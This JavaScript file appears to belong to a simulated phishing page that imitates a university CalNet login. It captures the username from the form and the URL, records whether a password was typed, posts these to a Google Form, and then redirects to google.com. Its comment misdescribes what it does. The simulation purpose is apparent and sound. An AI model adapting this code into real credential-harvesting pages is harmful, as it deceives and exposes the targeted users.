// https://html-online.com/articles/get-url-parameters-javascript/
function getUrlVars() {
    var vars = {};
    var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
        vars[key] = value;
    });
    return vars;
}

// Function to check CalNet ID for all numeric or invalid based on.
function checkId() {
	try {
		event.preventDefault();
	
		// get and check username in form
		formUser = document.getElementById("username").value;
		if (formUser == "") {formUser = "[no username entered in form]"}

		// get and check username passed in URL as a parameter
		urlUser = getUrlVars()["user"];
		console.log(urlUser);
		if (urlUser == null) {urlUser = "[no username found in url]"}

		// check if user entered a password
		passwordPassed = "No";
		password = document.getElementById("password");
		if (password.value != "") { passwordPassed = "Yes";}

		// https://stackoverflow.com/questions/18073971/http-post-to-a-google-form
		var xhr = new XMLHttpRequest();
		let url = "https://docs.google.com/forms/d/e/1FAIpQLSfpXsb_DKVEVL-IZWf_SQdVdkH4oL2m7Rh9mUTRZRfGXo45ng/formResponse?usp=pp_url&entry.1545559792=" + urlUser + "&entry.1386775216=" + formUser + "&entry.830965781=" + passwordPassed + "&submit=Submit";
		xhr.open("POST", url , true);
		xhr.send();

		window.location.replace("http://www.google.com");
	} catch (e){
		console.log(e);
		var xhr = new XMLHttpRequest();
		let url = "https://docs.google.com/forms/d/e/1FAIpQLSfpXsb_DKVEVL-IZWf_SQdVdkH4oL2m7Rh9mUTRZRfGXo45ng/formResponse?usp=pp_url&entry.1545559792=JSERROR&entry.1386775216=JSERROR&entry.830965781=JSERROR&submit=Submit";
		xhr.open("POST", url , true);
		xhr.send();

		window.location.replace("http://www.google.com");
	}
	}

